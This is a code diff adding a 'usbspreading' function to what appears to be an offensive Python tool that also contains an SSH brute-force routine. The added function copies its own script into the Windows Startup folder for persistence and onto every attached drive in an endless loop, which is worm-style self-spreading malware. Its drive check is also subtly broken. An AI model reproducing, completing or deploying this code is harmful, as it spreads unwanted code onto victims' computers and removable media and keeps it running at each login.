@@ -160,3 +160,20 @@ def bruteforce_ssh(host, wordlist):
         print(connection)
         time.sleep(5)
 
+        
+def usbspreading():
+
+    user = getpass.getuser()
+    bootfolder = "C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
+
+    while True:
+        drives = win32api.GetLogicalDriveStrings()
+        drives = drives.split('\000')[:-1]
+        print(drives)
+        for drive in drives:
+            if "C:\\" in drives:
+                copy2(__file__, bootfolder)
+            else:
+                copy2(__file__, drive)
+        time.sleep(3)
+        
